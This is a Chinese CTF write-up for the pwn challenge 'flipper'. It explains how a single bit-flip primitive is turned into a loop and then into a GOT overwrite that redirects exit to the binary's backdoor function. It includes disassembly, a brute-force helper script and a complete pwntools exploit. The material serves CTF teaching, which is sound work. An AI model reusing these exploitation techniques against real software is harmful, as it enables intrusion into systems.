# flipper

- 作者：13m0n4de
- 参考：[Hackergame-2023-超精准的宇宙射线模拟器](https://github.com/USTC-Hackergame/hackergame2020-writeups/tree/master/official/%E8%B6%85%E7%B2%BE%E5%87%86%E7%9A%84%E5%AE%87%E5%AE%99%E5%B0%84%E7%BA%BF%E6%A8%A1%E6%8B%9F%E5%99%A8) / [Hack.lu-2023-bit](https://ctftime.org/writeup/7894)
- 难度：Baby/Trivial/Easy/Normal/Medium/Hard/Expert/Insane
- 分类：Pwn
- 镜像：[svuctf-winter-2023/flipper](https://ghcr.io/svuctf/svuctf-winter-2023/flipper:latest)
- 端口：70

## 题目描述

快过年了，不要再讨论什么 CTF 之类的了。你带你的 Flag 回到家并不能给你带来任何实质性作用，朋友们兜里掏出一大把钱吃喝玩乐，你默默的在家里摆弄你的 EXP。亲戚朋友吃饭问你收获了什么，你说我可以翻转任意位置的一个 Bit，亲戚们懵逼了，你还在心里默默嘲笑他们，笑他们不懂你的后门函数，也笑他们连 GOT 表都不知道是什么。你父母的同事都在说自己的子女一年的收获，儿子买了个房，女儿买了个车，姑娘升职加薪了，你的父母默默无言，说我的儿子/女儿整天对着同样的几行代码发呆，时不时点一下就有好多花花绿绿的字出来。

## 题目解析

[Hackergame-2023-超精准的宇宙射线模拟器](https://github.com/USTC-Hackergame/hackergame2020-writeups/tree/master/official/%E8%B6%85%E7%B2%BE%E5%87%86%E7%9A%84%E5%AE%87%E5%AE%99%E5%B0%84%E7%BA%BF%E6%A8%A1%E6%8B%9F%E5%99%A8) 的简化版，添加了一个后门函数，就不需要写入 Shellcode 了。

### 前置知识

#### 数据单位

Bit（比特）是二进制数字的最小单位，也叫做「位」，表示为 0 或 1 。常说的「32/64 位系统」中的「位」，指的就是内存地址或其他数据单元的位数。

Byte（字节），一个 Byte 等于 8 Bit 。

以内存地址 `0x004012C2` 举例，它一共有 4 Byte，32 Bit 。

|     | 0        | 1        | 2        | 3        |
|-----|----------|----------|----------|----------|
| HEX | 00       | 42       | 12       | C2       |
| BIN | 00000000 | 01000010 | 00010010 | 11000010 |

#### 位运算

篇幅不够，自行搜索。

### 分析程序

`main` 函数：

```c
    0x00401217 sub rsp, 0x20                    |    puVar2 = *0x20 + -0x28;
    0x0040121b mov rax, qword fs:[0x28]         |    uStack_10 = *(in_FS_OFFSET + 0x28);
                                                |    do {
    0x00401243 call sym.imp.setvbuf             |        *(puVar2 + -8) = 0x401248;
    0x00401243 call sym.imp.setvbuf             |        sym.imp.setvbuf(_reloc.stdout, 0, 2, 0);
    0x00401261 call sym.imp.setvbuf             |        puVar3 = puVar2;
    0x00401261 call sym.imp.setvbuf             |        *(puVar2 + -8) = 0x401266;
    0x00401261 call sym.imp.setvbuf             |        sym.imp.setvbuf(_reloc.stdin, 0, 2, 0);
    0x00401270 call sym.imp.puts                |        puVar4 = puVar3;
    0x00401270 call sym.imp.puts                |        *(puVar3 + -8) = 0x401275;
    0x00401270 call sym.imp.puts                |        sym.imp.puts("You can flip only one bit in my memory. Where do you want to flip?");
    0x0040128f call sym.imp.__isoc99_scanf      |        *(puVar4 + -8) = 0x401294;
    0x0040128f call sym.imp.__isoc99_scanf      |        sym.imp.__isoc99_scanf("%p %d", &stack0xffffffffffffffe8, &stack0xffffffffffffffe4);
    0x0040128f call sym.imp.__isoc99_scanf      |        puVar5 = puVar4;
    0x004012a1 jg 0x4012dd                      |        if ((-1 < (uStack_1c & uStack_1c)) &&
    0x0040129b mov eax, dword [rbp - 0x14]      |           (uVar1 = uStack_1c,  uStack_1c == 7 || SBORROW4(uVar1, 7) != uVar1 + -7 < 0)) {
    0x004012c2 mov byte [rax], dl               |            *puStack_18 = *puStack_18 ^ 1 << (uStack_1c & 0x1f);
    0x004012ce call sym.imp.puts                |            *(puVar4 + -8) = 0x4012d3;
    0x004012ce call sym.imp.puts                |            sym.imp.puts("Done.");
    0x004012d8 call sym.imp.exit                |            *(puVar3 + -8) = 0x4012dd;
    0x004012d8 call sym.imp.exit                |            sym.imp.exit(0);
    0x004012d8 call sym.imp.exit                |            puVar5 = puVar3 + 0;
                                                |        }
    0x004012e7 call sym.imp.puts                |        *(puVar5 + -8) = 0x4012ec;
    0x004012e7 call sym.imp.puts                |        sym.imp.puts("Invalid input");
    0x004012e7 call sym.imp.puts                |        puVar2 = puVar5;
    0x004012ec jmp 0x40122a                     |    } while( true );
```

程序在一开始（`sym.__init`）调用了 `sym.imp.mprotect(sym._init, 0x1000, 7);` 将代码段设置为了可读可写可执行。

我们可以输入一个地址 addr 以及一个 `0-7` 的整数 bit，程序会帮我把 addr 地址的第 bit 位翻转（`0` 改成 `1`，`1` 改成 `0`），然后 `exit(0)` 程序退出。

来自 Hackergame-2020-超精准的宇宙射线模拟器 的题解：

> 我们只能翻转一个 bit，但只翻转一个 bit 不足以让我们获得任意命令执行的能力。\
> 所以这道题的关键在于，我们要利用翻转的第一个 bit 来创造出一个循环，使得我们可以翻转更多的 bit。\
> 可以翻转更多 bit 之后，我们就可以把 shellcode 写入代码段中，然后想办法跳转过去。

我们思路基本一致，只不过最后不是写入 Shellcode 而是想办法用上后门函数 `b4ckdoor` 。

### 创造循环

在 0x004012d8 处，程序调用 `exit` ：

```asm
│     ││╎   0x004012c4      488d058e0d00.  lea rax, str.Done.          ; 0x402059 ; "Done."
│     ││╎   0x004012cb      4889c7         mov rdi, rax                ; const char *s
│     ││╎   0x004012ce      e8bdfdffff     call sym.imp.puts           ; int puts(const char *s)
│     ││╎   0x004012d3      bf00000000     mov edi, 0                  ; int status
│     ││╎   0x004012d8      e803feffff     call sym.imp.exit           ; void exit(int status)
│     ││╎   ; CODE XREFS from main @ 0x401299(x), 0x4012a1(x)
│     └└──> 0x004012dd      488d057b0d00.  lea rax, str.Invalid_input  ; 0x40205f ; "Invalid input"
│       ╎   0x004012e4      4889c7         mov rdi, rax                ; const char *s
│       ╎   0x004012e7      e8a4fdffff     call sym.imp.puts           ; int puts(const char *s)
└       └─< 0x004012ec      e939ffffff     jmp 0x40122a
```

如果让它不要退出，就可以往下执行，到达 `jmp 0x40122a` 继续循环。

（IDA 的伪代码美观过头，容易误导，看不出来 `call exit` 下是 `jmp`）

`call sym.imp.exit` 的机器码是 `e803feffff`，其中 `E8` 是 `call` 的机器码，`03 FE FF FF` 是相对偏移值 0xfffffe03 。

这个 0xfffffe03 是有符号整数 `-509`，代表与 `call` 的下一条指令的距离。

比如说，`call` 的下一条指令是 `lea rax, str.Invalid_input`，地址为 `0x004012dd` 。

计算出来 `0x004012dd - 509 = 0x4010e0`，就是 `sym.imp.exit` 的地址，所以这条指令的含义是 `call sym.imp.exit` 。

不熟悉计算的同学可以用编程语言代劳，比如 Python ：

```python
$ python
>>> import struct
>>> struct.unpack('<i',  b"\x03\xfe\xff\xff")[0]
-509
>>>
>>> hex(0x004012dd - 509)
0x4010e0
```

`<` 代表小端序，`i` 代表有符号整形。

*反编译和调试工具大多也都带有计算和转换的功能，灵活运用，不要手搓。*

说回 `call sym.imp.exit`，我们翻转 `03 Fe FF FF` 的其中一个 Bit，改变调用地址，就可以让程序不退出。

比如说，把 `0x03` 的第 7 个 Bit 从 `1` 翻转为 `0`，得到 `0x83`：

```
76543210
--------
00000011 -> 0x03
10000011 -> 0x83
```

*为什么是倒过来？因为是小端序，当时在 [Issue](https://github.com/SVUCTF/SVUCTF-WINTER-2023/issues/23) 中记录的时候还不小心搞错了。*

0xfffffe83 是 `-381`，所以我们会跳转到 `0x004012dd - 381 = 0x401160`

这里正好是 `sym.register_tm_clones`

```asm
[0x00401160]> pdf
            ; CODE XREF from sym.frame_dummy @ 0x4011d4(x)
┌ 49: sym.register_tm_clones ();
│           0x00401160      be58404000     mov esi, loc._edata         ; obj.__TMC_END__
│                                                                      ; 0x404058
│           0x00401165      4881ee584040.  sub rsi, loc._edata         ; obj.__TMC_END__
│                                                                      ; 0x404058
│           0x0040116c      4889f0         mov rax, rsi
│           0x0040116f      48c1ee3f       shr rsi, 0x3f
│           0x00401173      48c1f803       sar rax, 3
│           0x00401177      4801c6         add rsi, rax
│           0x0040117a      48d1fe         sar rsi, 1
│       ┌─< 0x0040117d      7411           je 0x401190
│       │   0x0040117f      b800000000     mov eax, 0
│       │   0x00401184      4885c0         test rax, rax
│      ┌──< 0x00401187      7407           je 0x401190
│      ││   0x00401189      bf58404000     mov edi, loc._edata         ; obj.__TMC_END__
│      ││                                                              ; 0x404058
│      ││   0x0040118e      ffe0           jmp rax
│      ││   ; CODE XREFS from sym.register_tm_clones @ 0x40117d(x), 0x401187(x)
└      └└─> 0x00401190      c3             ret
```

这个函数是 GCC 编译器添加的用于支持事务内存的初始化函数，在程序启动的时候就执行过了，我们调用它不会让程序崩溃，并且在 `ret` 后可以回到 `main` 函数里。

所以我们输入 `0x004012d9 7` 就可以让程序一直循环，获得更多翻转 Bit 的机会。

（`0x004012d9` 指的是 `E8 03 FE FF FF` 的第二个字节 `03`，如果使用 `0x004012d8` 就是 `E8`）

那我怎么会知道翻转 `0x004012d9` 的第 7 个 Bit 刚好就能跳到这里呢？其实是运气。

我先尝试了翻转偏移值的最低位，因为这样影响较小，大概率还能在各函数的附近，然后看汇编能不能正常运行并返回 `main`。

其实条件并不是那么苛刻，只要跳转去的地方，程序正常运行、有 `ret` ，就可以了，跳到函数的开头只能算恰好的情况，并不必要。

流程：

```
计算 `03` 各 Bit 翻转后的相对偏移值 -> 算出实际跳转的位置 -> 去看它们的汇编。
```

更懒的做法是枚举，不断尝试各翻转偏移值的各个 Bit，直到获得第二次输入的机会。

这里是个简单的脚本（[find_addr.py](writeup/find_addr.py)）：

```python
from pwn import *

for addr in range(0x004012D8 + 1, 0x004012D8 + 5):
    for bit in range(8):
        io = process("./flipper")
        io.sendlineafter(b"flip?", f"{hex(addr)} {bit}".encode())
        try:
            io.recvuntil(b"Done.\n")
            io.recvline()  # 如果没有退出会继续输出 "Invalid input"，退出了就收不到抛出 EOFError
        except EOFError:
            continue
        else:
            success(f"{hex(addr)} {bit}")
        finally:
            io.close()
```

可以获得三个地址：

```
[+] 0x4012d9 4
[+] 0x4012d9 6
[+] 0x4012d9 7
```

### 跳转到后门函数

现在已经拥有了无限的翻转 Bit 的机会，我们需要找到一个 `call` 指令或者 `jmp` 指令，把跳转目标改为 `b4ckdoor` 。

可程序里没有很适合的地方，几个 `call` 指令全都在循环内，改的过程中程序可能就异常退出了，更别说 `jmp`，没了它循环就结束了。

那怎么办？

还记得我们是改了 `call sym.imp.exit` 吗，原先它是要调用 `exit` 的，从 GOT 表中找到地址进行跳转。

如果我们把 `exit` 的 GOT 表内容改为 `b4ckdoor` 的地址，再将 `call sym.imp.exit` 改回来，不就会调用 `b4ckdoor` 了嘛。

有点像格式化字符串里面修改 GOT 表，只不过这次我们得用翻转 Bit 来完成。

如果要将一个 Byte 翻转为我们想要的值，需要把原始数据和目标数据比较，不同的位就翻转一次：

```python
for bit in range(8):
    if original_byte & (1 << bit) != target_byte & (1 << bit):
        flip(original_addr, bit)
```

`flip` 函数拎出来会让程序整洁的多：

```python
def flip(addr: int, bit: int):
    info(f"fliping {hex(addr)} {bit}")
    io.sendlineafter(b"flip?\n", f"{hex(addr)} {bit}".encode())
```

完整 EXP（[exp.py](writeup/exp.py)）：

```python
from pwn import *

context.arch = "amd64"

io = process("./flipper")
elf = ELF("./flipper")


def flip(addr: int, bit: int):
    info(f"fliping {hex(addr)} {bit}")
    io.sendlineafter(b"flip?\n", f"{hex(addr)} {bit}".encode())


# 只读 4 位是偷懒，前面几位都是 0x00
exit_addr_bytes = elf.read(elf.got["exit"], 4)
b4ckdoor_addr_bytes = p32(elf.sym["b4ckdoor"])
info(f"exit_addr_bytes => {exit_addr_bytes.hex()}")
info(f"b4ckdoor_addr_bytes => {b4ckdoor_addr_bytes.hex()}")

# 获得循环
flip(0x004012D9, 7)

# 通过翻转修改 exit 的 GOT 表内容为 b4ckdoor 地址
for i in range(4):
    for bit in range(8):
        if b4ckdoor_addr_bytes[i] & (1 << bit) != exit_addr_bytes[i] & (1 << bit):
            flip(elf.got["exit"] + i, bit)

# 改回去，调用 call exit
flip(0x004012D9, 7)

io.interactive()
```

Hackergame 的做法依旧有效，这题只是在源码基础上加了个后门函数。
